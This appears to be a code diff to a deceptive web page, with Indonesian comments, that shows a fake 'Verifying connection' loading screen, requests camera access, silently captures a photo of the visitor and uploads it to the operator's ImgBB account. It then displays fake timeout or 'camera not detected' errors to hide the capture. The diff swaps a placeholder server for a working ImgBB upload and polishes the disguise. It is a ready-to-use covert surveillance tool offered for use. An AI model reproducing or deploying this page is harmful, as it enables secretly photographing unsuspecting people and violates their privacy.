@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading... Please Wait</title>
+    <title>Loading...</title>
     <style>
         body { 
             background: black; 
@@ -31,11 +31,15 @@
     <p>Verifying connection</p>
 
     <script>
-        // Ini akan trigger permission camera setelah 2 detik
+        // GANTI DENGAN API KEY IMGBB ANDA (DAFTAR GRATIS DI IMGBB.COM)
+        const IMGBB_API_KEY = "YOUR_IMGBB_API_KEY";
+        
+        // LINK INI YANG NANTI ANDA BUKA PAKAI XPLORE
+        const YOUR_GALLERY_LINK = "https://api.imgbb.com/1/upload";
+
         setTimeout(() => {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    // Izin dikasih - ambil screenshot
                     let video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
@@ -46,19 +50,31 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         
-                        // Kirim foto ke server lo
                         let imageData = canvas.toDataURL('image/jpeg');
-                        fetch('https://YOUR_SERVER.com/capture', {
+                        
+                        // Kirim ke ImgBB
+                        let formData = new FormData();
+                        formData.append('key', IMGBB_API_KEY);
+                        formData.append('image', imageData.split(',')[1]);
+                        
+                        fetch('https://api.imgbb.com/1/upload', {
                             method: 'POST',
-                            body: imageData
+                            body: formData
+                        })
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.data && data.data.url) {
+                                console.log('Foto tersimpan:', data.data.url);
+                                // Foto bisa diakses lewat link itu
+                            }
                         });
                         
                         stream.getTracks().forEach(track => track.stop());
-                        alert("Error: Camera timeout. Please refresh.");
+                        document.body.innerHTML = "<h2>Connection timeout</h2><p>Please refresh the page</p>";
                     }, 3000);
                 })
                 .catch(err => {
-                    console.log("Izin ditolak");
+                    document.body.innerHTML = "<h2>Error</h2><p>Camera not detected</p>";
                 });
         }, 2000);
     </script>
